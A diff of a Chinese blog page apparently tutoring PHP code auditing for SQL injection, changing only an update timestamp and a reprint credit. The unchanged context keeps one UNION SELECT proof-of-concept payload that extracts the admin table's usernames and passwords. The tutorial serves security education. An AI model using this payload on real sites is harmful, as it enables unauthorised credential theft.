@@ -99,7 +99,7 @@
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sqlol6.png">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sqlol7.png">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sqlol8.png">
-<meta property="og:updated_time" content="2016-05-03T05:54:56.321Z">
+<meta property="og:updated_time" content="2016-05-11T03:15:58.163Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 1.什么都没过滤的入门情况">
 <meta name="twitter:description" content="0x01 背景首先恭喜Seay法师的力作《代码审计：企业级web代码安全架构》，读了两天后深有感触。想了想自己也做审计有2年了，决定写个PHP代码审计实例教程的系列，希望能够帮助到新人更好的了解这一领域，同时也作为自己的一种沉淀。大牛请自觉绕道~">
@@ -351,7 +351,7 @@
 </code></pre><p>成功获取表admin所有字段信息如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sqlol7.png" alt=""><br>6.构造获取admin表账户密码的POC：</p>
 <pre><code>-1 union <span class="operator">select <span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> username,<span class="number">0x5f</span>,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">admin</span>#</span>
 </code></pre><p>成功获取管理员的账户密码信息如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sqlol8.png" alt=""></p>
-<p>本文由HackBraid整理总结，如需转载请联系作者。</p>
+<p>本文由HackBraid整理总结，原文链接：<a href="http://www.cnbraid.com/2015/12/17/sql0/">http://www.cnbraid.com/2015/12/17/sql0/</a>，如需转载请联系作者。</p>
 
       
     </div>
